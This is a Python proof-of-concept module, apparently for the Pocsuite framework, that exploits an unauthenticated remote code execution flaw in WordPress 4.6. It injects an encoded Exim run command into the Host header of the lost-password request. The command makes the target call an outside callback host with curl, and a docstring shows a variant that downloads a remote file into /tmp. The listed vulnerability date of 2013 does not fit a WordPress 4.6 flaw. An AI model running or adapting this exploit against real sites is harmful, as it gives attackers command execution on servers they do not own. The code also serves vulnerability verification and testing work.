#!/usr/bin/python
# -*- coding: utf-8 -*-


# If you have issues about development, please read:
# https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
# https://github.com/knownsec/Pocsuite/blob/master/docs/COPYING

import string
import random
import time
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


def prep_host_header(cmd):
    """
    target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)
    /usr/bin/curl -o/tmp/rce $rev_host/rce.txt
    """
    rce_cmd = "${run{%s}}" % cmd
    rce_cmd = rce_cmd.replace('/', '${substr{0}{1}{$spool_directory}}')
    rce_cmd = rce_cmd.replace(' ', '${substr{10}{1}{$tod_log}}')
    rce_cmd = 'target(any -froot@localhost -be %s null)' % rce_cmd
    return rce_cmd


def send_command(url, cmd):
    try:
        httpreq = req.Session()
        headers = {'Content-Type': 'application/x-www-form-urlencoded',
                   'User-Agent': 'GoogleSpider',
                   'Host': prep_host_header(cmd)
                   }
        data = 'user_login=admin&wp-submit=Get+New+Password'
        resp = httpreq.post(url, headers=headers, data=data)
    except Exception as ex:
        resp = None
    return resp


class TestPOC(POCBase):
    name = 'WordPress Core 4.6 - Unauthenticated Remote Code Execution'
    vulID = '93077'  # https://www.seebug.org/vuldb/ssvid-93077
    author = ['isqlmap']
    vulType = 'cmd-exec'
    version = '1.0'    # default version: 1.0
    references = ['https://legalhackers.com']
    desc = '''WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) 
    PoC Exploit (default configuration, no plugins, no auth)'''

    vulDate = '2013-02-14'
    createDate = '2017-05-03'
    updateDate = '2017-05-04'

    appName = 'WordPress'
    appVersion = '4.6'
    appPowerLink = 'https://wordpress.org'
    samples = ['']

    def verify_result(self, flag):
        url = "http://ceye.io/api/record?token=[YOUR CEYE TOKEN]&type=request&filter=wordpress"
        match_string = "wordpress.YOU-CEYE-ACCOUNT.ceye.io/{0}".format(flag)
        try:
            resp = req.get(url, timeout=30)
            if resp.content:
                if match_string in resp.content:
                    return True
        except Exception:
            pass
        return False

    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        self.url = self.url + '/wp-login.php?action=lostpassword'
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        flag = flag.lower()
        cmd = "/usr/bin/curl wordpress.YOU-CEYE-ACCOUNT.ceye.io/{0}".format(flag)
        resp = send_command(self.url, cmd)
        time.sleep(2)
        if self.verify_result(flag):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
